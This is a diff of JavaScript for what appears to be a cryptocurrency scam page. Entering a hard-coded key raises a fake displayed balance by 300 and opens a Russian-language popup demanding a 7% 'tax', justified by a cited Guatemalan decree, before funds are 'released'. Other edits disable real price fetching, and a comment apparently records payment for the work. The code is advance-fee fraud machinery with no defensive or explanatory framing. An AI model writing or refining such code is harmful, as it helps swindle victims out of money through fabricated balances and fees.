@@ -1,55 +1,55 @@
 // alert("ОЖИДАЮ ОПЛАТУ: 250 БЕЛ. РУБЛЕЙ")
 
 /** FETCH **/
-const btc = document.getElementById('btc')
-const eth = document.getElementById('eth')
-const bnb = document.getElementById('bnb')
-const xrp = document.getElementById('xrp')
-const sol = document.getElementById('sol')
-let payload = null
-let gotPayloadTimes = 0
-fetch('/server.php')
-  .then(r => r.json())
-  .then(r => {
-    if (r.status === 'ERR') {
-      console.error('Error getting latest crypto quotes')
-      return
-    }
+// const btc = document.getElementById('btc')
+// const eth = document.getElementById('eth')
+// const bnb = document.getElementById('bnb')
+// const xrp = document.getElementById('xrp')
+// const sol = document.getElementById('sol')
+// let payload = null
+// let gotPayloadTimes = 0
+// fetch('/server.php')
+//   .then(r => r.json())
+//   .then(r => {
+//     if (r.status === 'ERR') {
+//       console.error('Error getting latest crypto quotes')
+//       return
+//     }
 
-    gotPayloadTimes++
-    payload = r.payload
-    document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
-    btc.innerText = r.payload.btc
-    eth.innerText = r.payload.eth
-    bnb.innerText = r.payload.bnb
-    xrp.innerText = r.payload.xrp
-    sol.innerText = r.payload.sol
-  })
+//     gotPayloadTimes++
+//     payload = r.payload
+//     document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+//     btc.innerText = r.payload.btc
+//     eth.innerText = r.payload.eth
+//     bnb.innerText = r.payload.bnb
+//     xrp.innerText = r.payload.xrp
+//     sol.innerText = r.payload.sol
+//   })
 
-setInterval(() => {
-  btc.innerText = formatWithCommas(doMathBtc(payload.btc))
-  eth.innerText = formatWithCommas(doMathEth(payload.eth))
-  bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
-}, 3500)
-setInterval(() => {
-  if (gotPayloadTimes === 1) return  // TODO: change to 2
-  fetch('/server.php')
-    .then(r => r.json())
-    .then(r => {
-      if (r.status === 'ERR') {
-        console.error('Error getting latest crypto quotes')
-        return
-      }
+// setInterval(() => {
+//   btc.innerText = formatWithCommas(doMathBtc(payload.btc))
+//   eth.innerText = formatWithCommas(doMathEth(payload.eth))
+//   bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
+// }, 3500)
+// setInterval(() => {
+//   if (gotPayloadTimes === 1) return  // TODO: change to 2
+//   fetch('/server.php')
+//     .then(r => r.json())
+//     .then(r => {
+//       if (r.status === 'ERR') {
+//         console.error('Error getting latest crypto quotes')
+//         return
+//       }
 
-      gotPayloadTimes++
-      payload = r.payload
-      btc.innerText = r.payload.btc
-      eth.innerText = r.payload.eth
-      bnb.innerText = r.payload.bnb
-      xrp.innerText = r.payload.xrp
-      sol.innerText = r.payload.sol
-    })
-}, 32000)
+//       gotPayloadTimes++
+//       payload = r.payload
+//       btc.innerText = r.payload.btc
+//       eth.innerText = r.payload.eth
+//       bnb.innerText = r.payload.bnb
+//       xrp.innerText = r.payload.xrp
+//       sol.innerText = r.payload.sol
+//     })
+// }, 32000)
 
 let lastHistoryState = history.state;
 window.addEventListener('popstate', (e) => {
@@ -106,7 +106,7 @@ btn.onclick = () => {
     `
   } else if (usedKey === 'X5K9-P2L8-Q3M7-R4N6') {
     const sum = document.getElementById('sum')
-    sum.innerText = '18,874'
+    sum.innerText = formatWithCommas(add300ToSum(sum.innerText))
     popupText.innerHTML = `
       <p>В соответствии с законодательством Республики Гватемала (Указ №26-92 Конгресса Республики Гватемала), для соблюдения налогового регулирования вам необходимо оплатить разовый налог в размере 7% от суммы.</p>
       <p>После успешной проверки и подтверждения оплаты ваша транзакция будет обработана в полном соответствии с законом.</p>
@@ -322,6 +322,14 @@ function formatWithCommas(num) {
   integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
 
   return integerPart + decimalPart;
+}
+
+function add300ToSum(sum) {
+  const num = parseFloat(sum.replace(/,/g, ''))
+
+  const res = num + 300
+
+  return res
 }
 
 function preventDefaultScroll(e) {
